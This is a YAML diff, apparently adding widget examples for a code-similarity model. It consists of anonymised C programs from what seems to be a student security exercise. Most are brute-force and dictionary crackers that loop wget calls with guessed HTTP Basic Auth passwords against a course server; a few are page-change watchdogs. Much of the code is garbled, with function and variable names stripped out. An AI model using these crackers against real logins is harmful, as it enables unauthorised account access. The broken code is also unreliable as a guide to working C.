+      \ *) serverHostent->h_addr, serverHostent->h_length);\n    }\n    else\n    {\n       getHostErrorMsg(errorMsg);\n \
+      \      printf(\"%s: %s\\n\", host, errorMsg);\n       exit(RETURN_ERROR);\n    }\n}\n\n\n\n \nvoid base64_encode(const\
+      \ unsigned char *input, unsigned char *output)\n{\n    static const char *codes = \n      \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\
+      ;\n\n    int i;\n    int len;\n    int lenfull;\n    unsigned char *p;\n    int a;\n    int b;\n    int c;\n    \n \
+      \   p = output;\n    len = strlen((char *) input);\n\n    \n\n    lenfull = 3*(len / 3);\n    for (i = 0; i < lenfull;\
+      \ i += 3) \n    {\n        *p++ = codes[input[0] >> 2];\n        *p++ = codes[((input[0] & 3) << 4) + (input[1] >> 4)];\n\
+      \        *p++ = codes[((input[1] & 0xf) << 2) + (input[2] >> 6)];\n        *p++ = codes[input[2] & 0x3f];\n        input\
+      \ += 3;\n    }\n\n\n    \n\n    if (i < len)\n    {\n        a = input[0];\n        b = (i+1 < len) ? input[1] : 0;\n\
+      \        c = 0;\n\n        *p++ = codes[a >> 2];\n        *p++ = codes[((a & 3) << 4) + (b >> 4)];\n        *p++ = (i+1\
+      \ < len) ? codes[((b & 0xf) << 2) + (c >> 6)] : '=';\n        *p++ = '=';\n    }\n\n    \n    *p = '\\0';\n \n}\n\n\n\
+      \n\nvoid getHostErrorMsg(char *message)\n{\n    switch (h_errno)\n    {\n         HOST_NOT_FOUND :\n             strcpy(message,\
+      \ \"The specified host is unknown\");\n             break;\n\n         NO_DATA:\n             strcpy(message, \"The\
+      \ specified host name is valid, but does not have   address\");\n             break;\n\n         NO_RECOVERY:\n    \
+      \         strcpy(message, \"A non-recoverable name server error occurred\");\n             break;\n\n         TRY_AGAIN:\n\
+      \             strcpy(message, \"A temporary error occurred   authoritative name server. Try again later.\");\n     \
+      \        break;\n\n        default:\n             strcpy(message, \" unknown name server error occurred.\");\n    }\n\
+      }\n\n"
+    - "# include <stdlib.h>\n# include <stdio.h>\n# include <strings.h>\n\n\nint ()\n{\n\t\n\tFILE* fpp;\t\t\t\t\t\t\t\t\t\
+      \t\n\tFILE* fp;\n\t\t\t\n\tchar s[100];\n\tint i;\n\t\n\twhile(1)\t\t\t\t\t\t\t\t\t\t\n\t{\n\t\tsystem(\"wget -nv http://www.cs.rmit.edu./students\"\
+      );\t\t\t\t\n\t\t\n\t\ti=0;\t\t\n\t\t\n\t\tfp = fopen(\"dummyindex.txt\",\"r\");\n\t\t\n\t\tif(fp == (FILE*) NULL)\t\t\
+      \t\t\t\t\t\t\n\t\t{\n\t\t\tprintf(\" is  previously saved webpage in the file\\n\");\n\t\t\ti=1;\n\t\t\tfp = fopen(\"\
+      dummyindex.txt\",\"w\");\n\n\t\t}\n\t\t\t\t\n\t\tfclose(fp);\n\t\t\n\t\t\t\t\n\t\t\n\t\t\n\t\t\n\t\tsystem(\"diff index.html\
+      \ dummyindex.txt > compareoutput.txt\");\t\t\n\n\t\t\t\t\n\t\tif(fpp != (FILE*) NULL)\t\n\t\t{\n\t\t\t\n\t\t\tfpp =\
+      \ fopen(\"compareoutput.txt\",\"r\");\t\t\t\t\t\n\t\t\t\n\t\t\tfgets(s,100,fpp);\t\t\t\t\t\t\t\n\t\t\t\n\t\t\tfclose(fpp);\t\
+      \t\t\t\t\t\t\t\n\t\t\n\t\t\n\t\t   \n\t\t\tif((strlen(s)>0) && i==0)\t\t\t\t\t\t\t\t\n\t\t\t{\n\t\t\t\tsystem(\"mail\
+      \ @cs.rmit.edu. < compareoutput.txt\");\t\n\t\t\t\tsystem(\"cp index.html dummyindex.txt\");\t\t\t\t\n\t\t\t\tprintf(\"\
+      Message has been sent\\n\");\t\t\t\t\n\t\t\t}\n\t\t\telse\n\t\t\t\tprintf(\" is  change in the \\n\");\t\t\t\n\t\t}\n\
+      \t\t\n\t\t\n\n\t\tsystem(\"rm index.html\")\t;\t\t\t\t\n\t\t\n\t\tsleep(86400);\t\t\t\t\t\t\t\t\t\n\t}\n\t\t\t\t\n\t\
+      return 1;\n}\n"
+    - "#include<stdio.h>\n#include<stdlib.h>\n#include<strings.h>\n#include<ctype.h>\n#include <sys/time.h>\n#define OneBillion\
+      \ 1e9\n\nint ()\n{   int startTime, stopTime, final;\n    int i,j,k;\n    FILE* fp;\n    int pass,len;\n    int count\
+      \ = 0;\n    char [50];\n    char url1[100];\n    char url2[100];\n\n    startTime = time();\n    fp = fopen(\"/usr/share/lib/dict/words\"\
+      ,\"r\");\n    while (fp !='\\0')\n     {\n       fgets( ,50,fp);\n\n       len = strlen();\n       [strlen()-1] ='\\\
+      0';\n\n       if(len <= 4)\n       {\n         count++;\n\t     printf(\"Checking for the word :%s\\n\",);\n\t     strcpy(url1\
+      \ ,\"wget --http-user= --http-passwd=\");\n\t     strcat(url1,);\n\t     strcpy(url2 , \" -nv -o output http://sec-crack.cs.rmit.edu./SEC/2/\
+      \ \");\n\t     strcat(url1,url2);\n\n\n\t     pass = system(url1);\n\t    if (pass == 0)\n\t    {\n\t      stopTime\
+      \ = time();\n          final = stopTime-startTime;\n\t      printf(\"\\n SUCCESS\\n\");\n\t      printf(\"The password\
+      \ for the user  : %s\\n \",);\n\t      printf(\"Found the password in %lld nanoseconds (%1f seconds) \\n\",final,(double)final/OneBillion);\n\
+      \t       printf(\"Number of attempts : %d\\n\",count);\n          exit(1);\n\t }\n        }\n       }\n\n }\n"
+  - source_sentence: "\n\n#include<stdio.h>\n#include<stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/time.h>\n\
+      #include<string.h>\nint ()\n{\nchar a[100];\nint count=0;\nchar ch;\nchar line[100];\nchar filename[50];\nchar *token;\n\
+      const char delimiter[]=\" \\n.,;:!-\";\nFILE *fp;\nint  total_time,start_time,end_time;\nstart_time = time();\nstrcpy(filename,\"\
+      /usr/share/lib/dict/words\");\nif((fp=fopen(filename,\"r\"))==NULL){\nprintf(\"cannot open file\\n\");\nexit(1);\n}\n\
+      while((fgets(line,sizeof(line),fp))!=NULL)\n{\n        token=strtok(line,delimiter); \n        while(token!=NULL)\n\
+      \                {\n            count++;\n\t    printf(\"ATTEMPT : %d\\n\",count);\nstrcpy(a,\"wget http://sec-crack.cs.rmit.edu./SEC/2/index.php\
+      \ --http-user= --http-passwd=\");\n                strcat(a,token);                \n                printf(\"The request\
+      \ %s\\n\",a); \n                if(system(a)==0)\n\t\t{\n\t\tprintf(\"Congratulations!!!Password obtained using DICTIONARY\
+      \ ATTACK\\n\");\n\t\tprintf(\"************************************************************\\n\");\n\t\tprintf(\"Your\
+      \ password is %s\\n\",token);\n\t\tprintf(\"The Request sent is %s \\n\",a);\n                end_time = time();\n \
+      \               total_time = (end_time -start_time);\n                total_time /= 1000000000.0;\n                printf(\"\
+      The Time Taken is : %llds\\n\",total_time);\n\t\texit(1);\n\t\t}\n\n              \n                token=strtok(NULL,delimiter);\n\
+      \                \n                 }\n}\n\n\nfclose(fp);\nreturn 0;\n}\n"
+    sentences:
+    - "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <unistd.h>\n\t\t\t\t  \n\n\n#define USERNAME\
+      \ \"\"\n#define URL \"sec-crack.cs.rmit.edu./SEC/2\"\n#define TEST_URL \"yallara.cs.rmit.edu./~/secure\"\n#define MAX_PASSWD_LEN\
+      \ 3\n#define MAX_CHAR_SET 52\n\n#define TRUE 1\n#define FALSE 0\n\n\n\n\n\n\n\n\ntypedef int (*CrackFuncPtr)(const char*,\
+      \ const char*);\n\nint runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func);\nchar* initPasswdStr(int\
+      \ len, char ch);\nint getChPos(const char chSet[], int numOfCh, char ch);\nint pow(int x, int y);\nint crackHTTPAuth(const\
+      \ char *username, const char *passwd);\n\nint ()\n{\n\tchar charSet[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I',\
+      \ 'J', 'K',\n\t\t\t\t\t\t\t'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', \n\t\t\t\t\t\t\t'W', 'X', 'Y', 'Z',\n\
+      \t\t\t\t\t\t\t'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',\n\t\t\t\t\t\t\t'l', 'm', 'n', 'o', 'p', 'q', 'r',\
+      \ 's', 't', 'u', 'v', \n\t\t\t\t\t\t\t'w', 'x', 'y', 'z'};\n\t\n\tchar charSetS[] = {'A', 'B', 'C'};\n\n\tint i; \n\t\
+      \n\tfor (i=1; i<=MAX_PASSWD_LEN; i++)\n\t{\n\t\tif (runBruteForce(charSet, MAX_CHAR_SET, i, crackHTTPAuth))\n\t\t{\n\
+      \t\t\treturn 0;\n\t\t}\n\t}\n\n\tprintf(\"\\n...password not found\\n\");\t\t\t\t\t\t\t \t\n\treturn 0;\n}\n\nint runBruteForce(const\
+      \ char chSet[], int numOfCh, int len, CrackFuncPtr func)\n{\n\tint iter; \n\tint chIter; \n\tint curPos = 0; \n\t\n\t\
+      char *str;\n\t\n\tint passwdFound = FALSE;\n\t\n\tstr = initPasswdStr(len, chSet[0]);\n\n\tprintf(\"\\nNow trying %d\
+      \ character(s)\\n\", len);\n\n\n\tfor (iter=0; iter<pow(numOfCh, len)&&!passwdFound; iter++)\n\t{\n\t\tfor (chIter=len-1;\
+      \ chIter>=0; chIter--)\n\t\t{\n\t\t\tif (iter % pow(numOfCh, chIter) == 0) \n\t\t\t{\n\t\t\t\tcurPos = getChPos(chSet,\
+      \ numOfCh, str[chIter]);\n\t\t\t\tstr[chIter] = chSet[curPos+1];\n\t\t\t}\n\n\t\t\tif (iter % pow(numOfCh, (chIter+1))\
+      \ == 0) \n\t\t\t{\n\t\t\t\tstr[chIter] = chSet[0];\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (func(USERNAME, str))\n\t\t{\n\t\t\t\
+      printf(\"\\nPassword found: %s\\n\", str);\n\t\t\tpasswdFound = TRUE;\n\t\t}\n\n\t\t\n\t\tprintf(\".\");\n\t\t\t\t\t\
+      \n\t}\n\n\t(str);\n\tstr = NULL;\n\n\treturn passwdFound;\n}\n\nint getChPos(const char chSet[], int numOfCh, char ch)\n\
+      {\n\tint i;\n\t\n\tfor (i=0; i<numOfCh; i++)\n\t{\n\t\tif (chSet[i] == ch)\n\t\t{\n\t\t\treturn i;\n\t\t}\n\t}\n\n\t\
+      return -1;\n\t\n}\n\nchar* initPasswdStr(int len, char ch)\n{\n\tint i;\n\n\tchar *str;\n\n\tstr = malloc(len);\n\n\t\
+      if (str)\n\t{\n\t\tfor (i=0; i<len; i++)\n\t\t{\n\t\t\tstr[i] = ch;\n\t\t}\n\t\tstr[len] = '\\0';\n\t}\n\telse\n\t{\n\
+      \t\tfprintf(stderr, \"\\nError: Unable  allocate %d bytes memory.\");\n\t\texit(1);\n\t}\n\t\n\treturn str;\n}\n\nint\
+      \ pow(int x, int y)\n{\n\tint ans = 1, i;\n\t\n\tfor (i=0; i<y; i++)\n\t{\n\t\tans *= x;\n\t}\n\n\treturn ans;\n}\n\n\
+      int crackHTTPAuth(const char *username, const char *passwd)\n{\n\tchar cmd[256];\n\tstruct stat fileInfo;\n\t\n\tsprintf(cmd,\
+      \ \"wget -O  -q --http-user=%s --http-passwd=%s --proxy=off %s\", \n\t\t\t\t\t\tusername, passwd, URL);\n\n\tsystem(cmd);\t\
+      \n\n\t(void)stat(\"\", &fileInfo); \n\n\treturn fileInfo.st_size;\n\t\n}\n\n"
+    - "#include<stdio.h>\n#include<stdlib.h>\n#include<strings.h>\n#include<ctype.h>\n#include <sys/time.h>\n#define OneBillion\
+      \ 1e9\n\nint ()\n{   int startTime, stopTime, final;\n    int i,j,k;\n    FILE* fp;\n    int pass,len;\n    int count\
+      \ = 0;\n    char [50];\n    char url1[100];\n    char url2[100];\n\n    startTime = time();\n    fp = fopen(\"/usr/share/lib/dict/words\"\
+      ,\"r\");\n    while (fp !='\\0')\n     {\n       fgets( ,50,fp);\n\n       len = strlen();\n       [strlen()-1] ='\\\
+      0';\n\n       if(len <= 4)\n       {\n         count++;\n\t     printf(\"Checking for the word :%s\\n\",);\n\t     strcpy(url1\
+      \ ,\"wget --http-user= --http-passwd=\");\n\t     strcat(url1,);\n\t     strcpy(url2 , \" -nv -o output http://sec-crack.cs.rmit.edu./SEC/2/\
+      \ \");\n\t     strcat(url1,url2);\n\n\n\t     pass = system(url1);\n\t    if (pass == 0)\n\t    {\n\t      stopTime\
+      \ = time();\n          final = stopTime-startTime;\n\t      printf(\"\\n SUCCESS\\n\");\n\t      printf(\"The password\
+      \ for the user  : %s\\n \",);\n\t      printf(\"Found the password in %lld nanoseconds (%1f seconds) \\n\",final,(double)final/OneBillion);\n\
+      \t       printf(\"Number of attempts : %d\\n\",count);\n          exit(1);\n\t }\n        }\n       }\n\n }\n"
+    - "#include<stdio.h>\n#include<stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/time.h>\n\nint ()\n\
+      {\n char lc[53]=\"abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n char uc[53]=\"abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\
+      ;\n char gc[53]=\"abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n int a=0,b=0,c=0,d,e,count=0;\n char [100],temp1[100],temp2[100],temp3[100],temp4[10],temp5[50],p[100],q[50],r[50];\n\
+      \ char result,result1,result2,mx[100],mx1,mx2,mx3,mx4;\n \n int  ,end,t;\n  = time(); \nwhile(sizeof(lc)!=52)\n{\n \
+      \    temp2[0]=lc[d];\n     temp2[1]='\\0';\n     d=d+1;\n     strcpy(p,temp2);\n   \n   while(sizeof(uc)!=52)\n   {\n\
+      \      temp3[0]=uc[b];\n      temp3[1]='\\0';\n      b=b+1;\n      strcpy(q,p);\n      strcat(q,temp3);\n    for(e=0;e<52;e++)\n\
+      \    {\n        temp1[0]=gc[e];\n\ttemp1[1]='\\0';\n\tstrcpy(r,q);\n\tstrcat(r,temp1);\n       strcpy(mx,\"wget http://sec-crack.cs.rmit.edu./SEC/2\
+      \ --http-user= --http-passwd=\");\n       strcat(mx,r);\n       printf(\"temp3=%s\\n\",mx);\n       if(system(mx)==0)\n\
+      \       { \n         printf(\"Password=%s\\n\",mx);\n\t printf(\"%d \\n\",count);\n\t end = time();\n         t = (end\
+      \ -);\n         t /= 1000000000.0;\n         printf(\"The total time_var taken is:%llds\\n\",t);\n\t exit(1);\n    \
+      \   \n       }\n      }\n     }\n }\n return 0;\n}\n"
+  - source_sentence: "\n\n\n\n\n\n\n\n\n\n\n\n#include<stdio.h>\n#include<stdlib.h>\n#include<strings.h>\n#include<sys/types.h>\n\
+      #include<sys/times.h>\n#include<sys/time.h>\n#include<unistd.h>\n\nint ()\n{\n  char url[80];\n  char syscom[]= \"wget\
+      \ -nv --http-user= --http-passwd=\";\n  char http[] = \"http://sec-crack.cs.rmit.edu./SEC/2/\";\n  char [] =\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\
+      ;\n\n  char username[8];\n  char pass[4];\n  int i,j,k,hack=1;\n  int attempt = 1;\n  int , end, time_var;\n\n   = time();\n\
+      \  for ( i = 0 ;i<strlen();i++)\n    {\n      pass[0]=[i];\n      for( j = 0 ;j<strlen();j++)\n        {\n         \
+      \ pass[1]=[j];\n          for ( k = 0 ;k<strlen();k++)\n             {\n               fflush(stdin);\n            \
+      \   pass[2]=[k];\n               pass[3]='\\0';\n               printf(\"%s\\n\",pass);\n\n               sprintf(url,\"\
+      %s%s %s\",syscom,pass,http);\n               hack = system(url);\n               attempt++;\n               if (hack\
+      \ == 0)\n               {\n                  end = time();\n                  time_var = (end-);\n                 \
+      \ printf(\"\\nbr\tThe password is :%s\",pass);\n                  printf(\"\\nNo. of Attempts   crack the password :%d\"\
+      ,attempt);\n                  printf(\"\\nTime taken  crack the password = %lld sec\\n\",time_var/1000000000);\n   \
+      \               exit(1);\n                }\n              }\n          }\n      }\n }\n\n"
+    sentences:
+    - "#include<stdio.h>\n#include<string.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<sys/time.h>\n\n()\n{\n\tint\
+      \ i,m,k,count=0;\n\tFILE* diction;\n\tFILE* log;\n\tchar s[30];\n\tchar pic[30];\n\tchar add[1000];\n\tchar end[100];\n\
+      \ttime_t ,finish;\n\tdouble ttime;\n\t\n\tstrcpy(add,\"wget --http-user= --http-passwd=\");\n\tstrcpy( end,\"-nv -o\
+      \ logd http://sec-crack.cs.rmit.edu./SEC/2/\");\n\tdiction=fopen(\"/usr/share/lib/dict/words\",\"r\");\n\t=time(NULL);\n\
+      \twhile(fgets(s,100,diction)!=NULL)\t\n\t{\t\n\t\tprintf(\"%s\\n\",s);\n\t\tfor(m=40,k=0;k<(strlen(s)-1);k++,m++)\n\t\
+      \t{\n\t\t\tadd[m]=s[k];\n\t\t}\n\t\tadd[m++]=' ';\n\t\tfor(i=0;i<50;i++,m++)\n\t\t{\n\t\t\tadd[m]=end[i];\n\t\t}\n\t\
+      \tadd[m]='\\0';\n\t\t\n\t\tsystem(add);\n\t\tcount++;\n\t\tlog=fopen(\"logd\",\"r\");\n\t\tfgets(pic,100,log);\n\t\t\
+      printf(\"%s\",pic);\n\t\tif(strcmp(pic,\"Authorization failed.\\n\")!=0)\t\n\t\t{\n\t\t\tfinish=time(NULL);\n\t\t\t\
+      ttime=difftime(,finish);\n\t\t\tprintf( \"\\n The time_var take:%f/n The  of passwords tried is %d\\n\",ttime,count);\n\
+      \t\t\tbreak;\n\t\t}\n\t\tfclose(log);\n\t}\n\n}\n"
+    - "#include<stdio.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<ctype.h>\n\n#define MAX_SIZE 255\n\n\nint CrackPasswd(FILE\
+      \ *fp)\n{\n   int i, cnt, flag;\n   char string1[MAX_SIZE],string2[MAX_SIZE],[MAX_SIZE], passwd[MAX_SIZE];\n   char\
+      \ fin;\n   \n   strcpy(string1,\"wget http://sec-crack.cs.rmit.edu./SEC/2/\");\n   strcpy(string2,\" --http-user= --http-passwd='\"\
+      );\n   strcpy(,\"\");\n\n   while ((fin = fgetc(fp)) != EOF)\n   {\n      cnt = 0;\n      \n      for (i=0;i<MAX_SIZE;i++)\n\
+      \      {   \n         passwd[i] = '\\0';\n         [i] = '\\0';\n      }\n\t \n      while(fin != '\\n')\n      {\n\t\
+      \ passwd[cnt] = fin;\n\t cnt++;\n\t fin = fgetc(fp);\n      } \n         \n      if(strlen(passwd) <= 3)\n      {\n\
+      \         strcat(, string1);\n         strcat(, string2);\n\t strcat(, passwd);\n\t strcat(, \"'\");\n\t printf(\"Sending\
+      \ Request as %s\\n\",);\n\t flag = system();\n\t  \n         if (flag == 0)\n\t {\n            printf(\"\\nPassword\
+      \ is %s\\n\",passwd);\n\t    return 1;\n\t }\n         \n\t strcpy(,\"\"); \n         strcpy(passwd,\"\");\n       }\n\
+      \    }\n}  \n\n\nint  (int argc, char *argv[])\n{\n   char *fname;\n   FILE *fp;\n   \n   int , end;    \n   \n    =\
+      \ time();\n    \n   if (argc != 2)\n   {\n      fprintf(stdout,\"Usage : ./Dictionary <dictionary>\\n\");\n      return(EXIT_FAILURE);\n\
+      \   }\n   \n   fname = argv[1];\n   \n   if((fp = fopen(fname, \"r\")) == NULL)\n   {\n      fprintf(stderr,\"Error\
+      \ : Failed  open %s for . \\n\",fname);\n      return(EXIT_FAILURE);\n   }\n   \n   CrackPasswd(fp);\n  \n   end = time();\
+      \ \n   printf(\"Time Required = %lld msec\\n\",(end-)/());\n   return (EXIT_SUCCESS);\n  \n}\n     \n\t   \n\t  \t\n"
+    - "#include<stdio.h>\n#include<stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/time.h>\n\nint ()\n\
+      {\n  FILE *fh,*fp,*fp1,*d;\n  char\n  [10000],PassString[50],p[10000],temp1[10000],filename[50],f1,f2,temp2[100];\n\
+      \  sleep(60*60*24);\n  system(\"wget http://www.cs.rmit.edu./students\");\n  if(system==0)\n  {\n   printf(\"File stored\"\
+      );\n  }\n  strcpy(filename,\"index.html\"); \n  if((fh=fopen(filename,\"r\"))==NULL)\n  {\n   printf(\"cannot open file\\\
+      n\");\n   exit(1);\n  }\n  fp=fopen(\"index.txt\",\"r\");\n  fp1=fopen(\"index1.txt\",\"r\");\n \n  while((fgets(PassString,sizeof(PassString),fh))!=\
+      \ NULL)\n  {\n    fread(p,sizeof(PassString),sizeof(PassString),fh);\n    printf(\" contents %s\\n\",p);\n    while((f1!=EOF)\
+      \ || (f2!=EOF))\n    {\n     f1=getc(fp);\n     f2=getc(fp1);\n     if(f1<f2)\n     {\n     strcpy(,p);\n     fp=fopen(\"\
+      index.txt\",\"r+b\");\n     fputs(,fp);\n     fflush(fp); \n     fclose(fp); \n    }\n    else\n    {\n      strcpy(temp1,p);\n\
+      \      fp1=fopen(\"index1.txt\",\"r+b\");\n      fputs(temp1,fp1);\n      fflush(fp1);\n      fclose(fp1);\n    }\n\
+      \    }\n    if(system(\"diff -b -w index.txt index1.txt > Diff.txt\")==0)\n    {\n      d=fopen(\"Diff.txt\",\"r\");\n\
+      \      if((fgets(,sizeof(),d))!=NULL)\n      {\n        printf(\"The difference between  exist\");\n\tsystem(\"Mail\
+      \ \\r\\n Difference\");\n      }\n      \n    }\n  }\n return 0;\n  }\n"
+  - source_sentence: "#include<stdio.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<ctype.h>\n\n#define MAX_SIZE 255\n\
+      \n\nint CrackPasswd(FILE *fp)\n{\n   int i, cnt, flag;\n   char string1[MAX_SIZE],string2[MAX_SIZE],[MAX_SIZE], passwd[MAX_SIZE];\n\
+      \   char fin;\n   \n   strcpy(string1,\"wget http://sec-crack.cs.rmit.edu./SEC/2/\");\n   strcpy(string2,\" --http-user=\
+      \ --http-passwd='\");\n   strcpy(,\"\");\n\n   while ((fin = fgetc(fp)) != EOF)\n   {\n      cnt = 0;\n      \n    \
+      \  for (i=0;i<MAX_SIZE;i++)\n      {   \n         passwd[i] = '\\0';\n         [i] = '\\0';\n      }\n\t \n      while(fin\
+      \ != '\\n')\n      {\n\t passwd[cnt] = fin;\n\t cnt++;\n\t fin = fgetc(fp);\n      } \n         \n      if(strlen(passwd)\
+      \ <= 3)\n      {\n         strcat(, string1);\n         strcat(, string2);\n\t strcat(, passwd);\n\t strcat(, \"'\"\
+      );\n\t printf(\"Sending Request as %s\\n\",);\n\t flag = system();\n\t  \n         if (flag == 0)\n\t {\n          \
+      \  printf(\"\\nPassword is %s\\n\",passwd);\n\t    return 1;\n\t }\n         \n\t strcpy(,\"\"); \n         strcpy(passwd,\"\
+      \");\n       }\n    }\n}  \n\n\nint  (int argc, char *argv[])\n{\n   char *fname;\n   FILE *fp;\n   \n   int , end;\
+      \    \n   \n    = time();\n    \n   if (argc != 2)\n   {\n      fprintf(stdout,\"Usage : ./Dictionary <dictionary>\\\
+      n\");\n      return(EXIT_FAILURE);\n   }\n   \n   fname = argv[1];\n   \n   if((fp = fopen(fname, \"r\")) == NULL)\n\
+      \   {\n      fprintf(stderr,\"Error : Failed  open %s for . \\n\",fname);\n      return(EXIT_FAILURE);\n   }\n   \n\
+      \   CrackPasswd(fp);\n  \n   end = time(); \n   printf(\"Time Required = %lld msec\\n\",(end-)/());\n   return (EXIT_SUCCESS);\n\
+      \  \n}\n     \n\t   \n\t  \t\n"
+    sentences:
+    - "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/time.h>\n#include <strings.h>\n#include <ctype.h>\n\nint ()\n\
+      {\n  FILE *fp; \n  char *chk,[4];\n  int i=1;\n  while (i == 1) \n  {\n  \n  system(\"wget -p --convert-links http://www.cs.rmit.edu./students/\"\
+      );\n\n  system(\"mkdir first\"); \n  system(\"mkdir second\"); \n\n  \n  system(\"mv www.cs.rmit.edu./images/*.*  first/\"\
+      );\n  system(\"mv www.cs.rmit.edu./students/*.* first/\");\n\n  sleep(86400); \n\n  \n  system(\"wget -p --convert-links\
+      \ http://www.cs.rmit.edu./students/\");\n\n  \n  system(\"mv www.cs.rmit.edu./images/*.* second/\");\n  system(\"mv\
+      \ www.cs.rmit.edu./students/*.* second/\");\n\n  \n  \n  system(\"diff first second > imagesdifference.txt\");\n\n \
+      \ \n  fp = fopen(\"imagesdifference.txt\",\"r\");\n  \n  chk = fgets(, 4, fp);\n  \n  if (strlen() != 0)\n     system(\"\
+      mailx -s  \\\"Difference from WatchDog\\\"  < imagesdifference.txt\");\n  }\n  return 0;\n}\n"
+    - "\n\n\n \n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <sys/wait.h>\n\
+      #include <signal.h>\n#include <sys/signal.h>\t\t\t  \n\n\n#define USERNAME \"\"\n#define URL \"sec-crack.cs.rmit.edu./SEC/2\"\
+      \n#define TEST_URL \"yallara.cs.rmit.edu./~/secure\"\n#define MAX_PASSWD_LEN 3\n#define MAX_CHAR_SET 52\n#define NUM_OF_PROCESSES\
+      \ 4\n\n#define TRUE 1\n#define FALSE 0\n\n\n\n\n\n\n\n\n\n\ntypedef int (*CrackFuncPtr)(const char*, const char*, int);\n\
+      \n\nint pwdFound;\nint cDie;\n\n\nint runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func\n\t\t\
+      \t\t\t\t, int sCh, int eCh, int id);\nchar* initPasswdStr(int len, char ch, char headOfChSet);\nint getChPos(const char\
+      \ chSet[], int numOfCh, char ch);\nint pow(int x, int y);\nint crackHTTPAuth(const char *username, const char *passwd,\
+      \ int id);\nint myFork(const char chSet[], int numOfCh, int len, CrackFuncPtr func\n\t\t\t\t, int sCh, int eCh);\n\n\
+      \n\n\n\nvoid passwdFoundHandler(int signum)\n{\n\tpwdFound = TRUE;\n}\n\n\n\nvoid childFinishHandler(int signum)\n{\n\
+      \tcDie++;\t\n}\n\n\n\n\n\nint main()\n{\n\tchar charSet[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',\
+      \ \n                     'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', \n\t\t\t\t\t 'W', 'X', 'Y', 'Z',\t\n\
+      \t\t\t\t\t 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',\t\n\t\t\t\t\t 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',\
+      \ 't', 'u', 'v', \n\t\t\t\t\t 'w', 'x', 'y', 'z'};\n\t\n\n\tint i;\t\n\tint pid[NUM_OF_PROCESSES];\n\n\tpwdFound = FALSE;\n\
+      \tcDie = 0;\n\t\n\tfor (i=0; i<NUM_OF_PROCESSES; i++)\n\t{\n\t\tpid[i] = myFork(charSet, MAX_CHAR_SET, MAX_PASSWD_LEN,\
+      \ crackHTTPAuth, \n\t\t\t\t\t\t(((MAX_CHAR_SET /NUM_OF_PROCESSES)*i)+1)-1, \n\t\t\t\t\t\t(MAX_CHAR_SET /NUM_OF_PROCESSES)*(i+1)-1);\n\
+      \t}\n\n\t\n\tfor (;;)\n\t{\n\t\tsignal(SIGUSR1, passwdFoundHandler);\n\t\tsignal(SIGUSR2, childFinishHandler);\n\n\t\
+      \t\n\t\tif (pwdFound)\n\t\t{\n\t\t\tfor (i=0; i<4; i++)\n\t\t\t{\n\t\t\t\tkill((int)pid[i], SIGKILL);\n\t\t\t}\n\t\t\
+      \texit(EXIT_SUCCESS);\n\t\t}\n\n\t\t\n\t\tif (cDie >= NUM_OF_PROCESSES)\n\t\t{\n\t\t\texit(EXIT_SUCCESS);\n\t\t}\n\n\
+      \t}\n\treturn EXIT_SUCCESS;\n}\n\n\n\nint myFork(const char chSet[], int numOfCh, int len, CrackFuncPtr func,\n\t\t\t\
+      \tint sCh, int eCh)\n{\n\tint i;\n\t\n\tint pid = fork();\n\n\tif (pid == 0)\n\t{\n\t\tfor (i=1; i<=len; i++)\n\t\t\
+      {\n\t\t\tif (runBruteForce(chSet, numOfCh, i, func, sCh, eCh, getpid()))\n\t\t\t{\t\n\t\t\t\t\n \t\t\t\tif (!kill(getppid(),\
+      \ SIGUSR1))\n\t\t\t\t{\n\t\t\t\t\tprintf(\"Process %d found the password and notified the parent process already\",\
+      \ \n\t\t\t\t\t\t\t\t\t(int)getpid());\n\t\t\t\t}\n\n\t\t\t\texit(EXIT_SUCCESS);\n\t\t\t}\n\t\t}\n\n\t\t\n\t\tif (!kill(getppid(),\
+      \ SIGUSR2))\n\t\t{\n\t\t\tprintf(\"Process %d could not found the password and notified the parent process already\"\
+      , \n\t\t\t\t\t\t\t\t\t(int)getpid());\n\t\t}\n\t\t\n\t\texit(EXIT_SUCCESS);\n\t}\n\telse if (pid > 0)\n\t{\n\t\treturn\
+      \ pid;\n\t}\n\telse\n\t{\n\t\tprintf(\"error\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n}\n\n\n\nint runBruteForce(const\
+      \ char chSet[], int numOfCh, int len, CrackFuncPtr func\n\t\t\t\t\t\t, int sCh, int eCh, int id)\n{\n\tint iter; \n\t\
+      int chIter; \n\tint curPos = 0; \n\t\n\tchar *str;\n\t\n\tint passwdFound = FALSE;\n\t\n\tstr = initPasswdStr(len, chSet[sCh],\
+      \ chSet[0]);\n\n\tprintf(\"\\nNow trying %d character(s)\\n\", len);\n\n\tfor (iter=0; (iter<pow(numOfCh, (len-1))*(eCh-sCh+1))&&(!passwdFound);\
